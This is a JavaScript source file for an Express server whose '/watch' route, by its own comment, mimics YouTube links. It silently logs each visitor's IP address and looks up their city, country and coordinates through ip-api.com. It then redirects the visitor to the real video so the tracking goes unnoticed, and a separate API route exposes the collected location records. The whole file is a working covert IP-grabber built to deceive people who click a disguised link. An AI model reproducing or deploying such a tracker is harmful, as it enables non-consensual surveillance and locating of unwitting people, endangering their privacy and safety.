const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Store IPs in memory
let trackedIPs = [];

// Add CORS headers
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    next();
});

// Middleware to get real IP
app.use((req, res, next) => {
    req.realIp = req.headers['x-forwarded-for'] || 
                 req.connection.remoteAddress || 
                 req.socket.remoteAddress;
    next();
});

// Watch route that mimics YouTube
app.get('/watch', async (req, res) => {
    try {
        const videoId = req.query.v;
        
        // Get real IP and clean it
        let ip = req.realIp.replace('::ffff:', '');
        // Extract first IP if multiple are present (from proxy chain)
        ip = ip.split(',')[0].trim();
        
        console.log('\x1b[36m%s\x1b[0m', `New visit from IP: ${ip}`);

        // Pour les tests locaux, utilisons une IP publique fictive
        if (ip === '::1' || ip === '127.0.0.1') {
            ip = '8.8.8.8';
            console.log('\x1b[33m%s\x1b[0m', `Local IP detected, using test IP: ${ip}`);
        }

        try {
            // Get IP info with cleaned IP
            const ipInfo = await axios.get(`http://ip-api.com/json/${ip}`);
            
            if (ipInfo.data.status === 'success') {
                console.log('\x1b[32m%s\x1b[0m', `Location found: ${ipInfo.data.city}, ${ipInfo.data.country}`);
                
                // Store in memory
                trackedIPs.push({
                    ip: ip,
                    country: ipInfo.data.country,
                    city: ipInfo.data.city,
                    latitude: ipInfo.data.lat,
                    longitude: ipInfo.data.lon,
                    timestamp: new Date().toISOString()
                });

                console.log('\x1b[32m%s\x1b[0m', `IP data stored successfully. Total IPs: ${trackedIPs.length}`);

                // Keep only last 100 IPs to manage memory
                if (trackedIPs.length > 100) {
                    trackedIPs = trackedIPs.slice(-100);
                }
            } else {
                console.error('\x1b[31m%s\x1b[0m', `IP API returned error status: ${ipInfo.data.message}`);
            }
        } catch (apiError) {
            console.error('\x1b[31m%s\x1b[0m', `Error calling IP API: ${apiError.message}`);
        }

        // Redirect to actual YouTube video
        if (videoId) {
            res.redirect(`https://youtube.com/watch?v=${videoId}`);
        } else {
            res.redirect('https://youtube.com');
        }

    } catch (error) {
        console.error('\x1b[31m%s\x1b[0m', `Error processing request: ${error}`);
        res.redirect('https://youtube.com');
    }
});

// API route to get tracked IPs
app.get('/api/tracked-ips', (req, res) => {
    console.log('\x1b[36m%s\x1b[0m', `API request received from: ${req.ip}`);
    console.log('\x1b[32m%s\x1b[0m', `API: Found ${trackedIPs.length} entries in memory`);
    res.json(trackedIPs);
});

// Test route
app.get('/api/test', (req, res) => {
    res.json({ status: 'ok', message: 'API is working' });
});

// Start server
app.listen(PORT, () => {
    console.log('\x1b[32m%s\x1b[0m', `Server running on port ${PORT}`);
}); 